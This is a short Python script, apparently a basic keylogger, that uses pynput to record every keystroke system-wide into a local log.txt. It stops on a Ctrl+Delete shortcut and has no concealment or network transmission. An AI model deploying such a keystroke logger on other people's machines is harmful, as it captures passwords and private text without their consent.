import os
from pynput import keyboard

# A set to keep track of keys currently held down to evaluate multi-key combos
current_keys = set()

def log_to_file(text):
    # Determine the directory where this script is located
    script_dir = os.path.dirname(os.path.abspath(__file__))
    log_path = os.path.join(script_dir, "log.txt")
    
    # Open 'log.txt' in append mode with explicit disk-writing controls
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(text)
        f.flush()                  # Forces Python to empty its memory buffer
        os.fsync(f.fileno())       # Forces Windows to write the data to the disk immediately

def on_press(key):
    # 1. Track the key state
    current_keys.add(key)

    # 2. Format the key name
    try:
        # For regular letters, numbers, and symbols
        key_data = key.char
    except AttributeError:
        # For layout structural keys
        if key == keyboard.Key.space:
            key_data = " "
        elif key == keyboard.Key.enter:
            key_data = "\n"
        else:
            key_data = f" [{key.name}] "

    # 3. Save the formatted key data to the file
    if key_data:
        log_to_file(key_data)

    # 4. Check for the Ctrl + Delete exit shortcut
    is_ctrl_pressed = (
        keyboard.Key.ctrl in current_keys or 
        keyboard.Key.ctrl_l in current_keys or 
        keyboard.Key.ctrl_r in current_keys
    )
    is_delete_pressed = (keyboard.Key.delete in current_keys)

    if is_ctrl_pressed and is_delete_pressed:
        log_to_file("\n[System: Listener Stopped]\n")
        return False  # Stops the listener loop and exits the process cleanly

def on_release(key):
    # Remove the key from our tracking set when released
    try:
        current_keys.remove(key)
    except KeyError:
        pass

# Start the background listener loop
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
